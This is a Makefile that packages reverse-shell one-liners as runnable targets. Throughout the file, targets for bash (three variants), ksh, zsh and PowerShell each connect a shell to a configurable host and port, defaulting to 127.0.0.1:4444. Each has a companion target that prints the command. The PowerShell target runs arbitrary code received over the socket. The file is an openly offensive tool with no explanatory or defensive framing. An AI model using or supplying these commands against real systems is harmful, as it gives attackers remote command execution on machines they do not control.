SHELL	:= $(or $(shell), /bin/bash)
HOST	:= $(or $(host), 127.0.0.1)
PORT	:= $(or $(port), 4444)

LIST	:= "methodlist.txt"

BOLD		:= \033[1m
UNDERLINE	:= \033[4m
GREEN		:= \033[32m
BLUE		:= \033[34m
RESET		:= \033[0m

blue=$(tput setaf 4)
normal=$(tput sgr0)

.PHONY: show

show:
	@printf "SHELL: $(GREEN)$(SHELL)$(RESET)\n"
	@printf "HOST: $(GREEN)$(HOST)$(RESET)\n"
	@printf "PORT: $(GREEN)$(PORT)$(RESET)\n"
	@printf "Available methods:\n"
	@while IFS= read -r cmd; do \
		printf "   $(BOLD)$(BLUE)%s$(RESET)\n" "$$cmd"; \
	done < $(LIST)
	@printf "Run $(UNDERLINE)make <method>$(RESET) to use a specific method from the list.\n"
	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"


########################### BASH ###########################

bash1:
	bash -c '$(SHELL) >& /dev/tcp/$(HOST)/$(PORT) 0>&1'

bash1-show:
	@printf "bash -c '$(SHELL) >& /dev/tcp/$(HOST)/$(PORT) 0>&1'\n"

bash2:
	bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); 0<&3; $(SHELL) <&3 >&3 2>&3'

bash2-show:
	@printf "bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); 0<&3; $(SHELL) <&3 >&3 2>&3'\n"

bash3:
	bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); cat <&3 | while read line; do $$line 2>&3 >&3; done'

bash3-show:
	@printf "bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); cat <&3 | while read line; do \$$line 2>&3 >&3; done'\n"

############################################################

######################## KORNSHELL #########################

ksh:
	ksh -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'

ksh-show:
	@printf "ksh -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'\n"

############################################################

######################### Z SHELL ##########################

zsh:
	zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(SHELL) 0<&3 1>&3 2>&3'

zsh-show:
	@printf "zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(SHELL) 0<&3 1>&3 2>&3'\n"

############################################################

######################## POWERSHELL ########################

pwsh:
	pwsh -c '$$TCPClient = New-Object Net.Sockets.TCPClient($(HOST), $(PORT)); $$NetworkStream = $$TCPClient.GetStream(); $$StreamReader = New-Object IO.StreamReader($$NetworkStream); $$StreamWriter = New-Object IO.StreamWriter($$NetworkStream); $$StreamWriter.AutoFlush = $$true; $$Buffer = New-Object System.Byte[] 1024; while ($$TCPClient.Connected) { while ($$NetworkStream.DataAvailable) { $$RawData = $$NetworkStream.Read($$Buffer, 0, $$Buffer.Length); $$Code = ([text.encoding]::UTF8).GetString($$Buffer, 0, $$RawData -1) }; if ($$TCPClient.Connected -and $$Code.Length -gt 1) { $$Output = try { Invoke-Expression ($$Code) 2>&1 } catch { $$_ }; $$StreamWriter.Write("$$Output`n"); $$Code = $$null } }; $$TCPClient.Close(); $$NetworkStream.Close(); $$StreamReader.Close(); $$StreamWriter.Close()'

pwsh-show:
	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient($(HOST), $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"

############################################################
